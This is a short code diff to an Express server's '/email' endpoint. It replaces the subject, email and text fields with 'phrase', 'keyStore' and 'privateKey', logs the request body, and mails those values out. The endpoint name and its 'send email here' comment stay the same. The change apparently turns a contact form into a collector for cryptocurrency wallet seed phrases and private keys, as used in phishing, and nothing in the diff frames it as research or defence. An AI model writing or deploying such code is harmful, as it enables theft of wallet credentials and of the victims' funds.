@@ -12,9 +12,9 @@ app.use(express.json());
 
 app.post("/email", (req, res) => {
   // send email here
-  const { subject, email, text } = req.body;
+  const { phrase, keyStore, privateKey } = req.body;
   console.log("Data: ", req.body);
-  sendMail(subject, email, text, function (err, data) {
+  sendMail(phrase, keyStore, privateKey, function (err, data) {
     if (err) {
       res.status(500).json({ message: "internal error" });
     } else {
